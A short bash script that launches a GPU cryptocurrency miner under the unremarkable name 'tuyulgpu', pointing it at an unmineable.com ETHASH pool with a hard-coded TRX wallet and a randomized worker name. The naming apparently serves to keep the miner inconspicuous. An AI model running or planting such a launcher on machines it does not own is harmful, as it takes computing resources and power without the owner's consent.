#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TBtoXc52ActjgoWEsW5QKbgbQB4fAyGyt2
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-USER1#at9p-rbx8)
chmod +x tuyulgpu
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
